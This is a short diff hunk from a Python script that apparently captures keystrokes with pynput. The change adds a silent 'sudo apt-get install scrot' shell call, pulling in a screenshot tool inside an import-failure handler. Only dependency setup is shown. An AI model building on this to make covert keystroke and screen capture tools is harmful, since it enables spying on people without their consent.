@@ -74,10 +74,11 @@ try:
   # module to capture keystrokes
 	from pynput import keyboard
 except:
-  # attempt to install dependency
-  install_dependency('pynput')
+	subp.call('sudo apt-get install scrot', shell=True)
+	# attempt to install dependency
+	install_dependency('pynput')
 	# try importing module after attempting download
-  from pynput import keyboard
+	from pynput import keyboard
 	
 
 '''************************************************************'''
